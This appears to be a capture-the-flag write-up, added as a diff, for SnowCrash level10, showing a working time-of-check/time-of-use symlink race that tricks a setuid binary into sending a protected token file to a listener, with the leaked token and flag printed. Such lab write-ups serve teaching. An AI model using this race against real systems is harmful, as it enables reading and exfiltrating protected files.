@@ -1,0 +1,65 @@
+#By doing strace we see a call to access then a call to open functions, we can exploit this timeframe to change the name of the file token to trick the program:
+level10@SnowCrash:~$ echo bob > /tmp/test2
+
+#We run a server on an infinite loop:
+level10@SnowCrash:~$ python server.py
+#Then we switch ln targets and hope that the program will execute at the moment the Time Of Check is over and the Time Of Use has not started.
+#The target will alternate real fast between a file we own /tmp/test2 and the file we want /home/user/level10/token
+level10@SnowCrash:~$ while true; do ln -sf /home/user/level10/token /tmp/toke; ln -sf /tmp/test2 /tmp/toke; done &
+[1] 7029
+level10@SnowCrash:~$ for i in {1..30}; do ./level10 /tmp/toke; done
+
+level10@SnowCrash:~$ while true; do ln -sf /home/user/level10/token /tmp/toke; ln -sf /tmp/test2 /tmp/toke; done &
+[2] 27010
+level10@SnowCrash:~$ python /tmp/server.py 
+Server listening on 10.13.200.62:6969
+Accepted connection from 10.13.200.62:53590
+Received from client 10.13.200.62: .*( )*.
+woupa2yuojeeaaed06riuj63c
+
+Server listening on 10.13.200.62:6969
+Accepted connection from 10.13.200.62:53591
+Received from client 10.13.200.62: .*( )*.
+bob
+
+Server listening on 10.13.200.62:6969
+Accepted connection from 10.13.200.62:53593
+Received from client 10.13.200.62: .*( )*.
+woupa2yuojeeaaed06riuj63c
+
+#We launch 30 times the program and cross fingers:
+level10@SnowCrash:~$ for i in {1..30}; do ./level10 /tmp/toke 10.13.200.62; done
+Sending file .. wrote file!
+Connecting to 10.13.200.62:6969 .. Connected!
+Sending file .. wrote file!
+You don't have access to /tmp/toke
+You don't have access to /tmp/toke
+Connecting to 10.13.200.62:6969 .. Connected!
+Sending file .. wrote file!
+Connecting to 10.13.200.62:6969 .. Connected!
+Sending file .. wrote file!
+Connecting to 10.13.200.62:6969 .. Connected!
+Sending file .. wrote file!
+You don't have access to /tmp/toke
+You don't have access to /tmp/toke
+Connecting to 10.13.200.62:6969 .. Connected!
+Sending file .. wrote file!
+Connecting to 10.13.200.62:6969 .. Connected!
+Sending file .. wrote file!
+Connecting to 10.13.200.62:6969 .. Connected!
+Sending file .. wrote file!
+You don't have access to /tmp/toke
+You don't have access to /tmp/toke
+You don't have access to /tmp/toke
+Connecting to 10.13.200.62:6969 .. Connected!
+Sending file .. wrote file!
+Connecting to 10.13.200.62:6969 .. Unable to connect to host 10.13.200.62
+
+
+#we get the flag:
+level10@SnowCrash:~$ su flag10
+Password: 
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
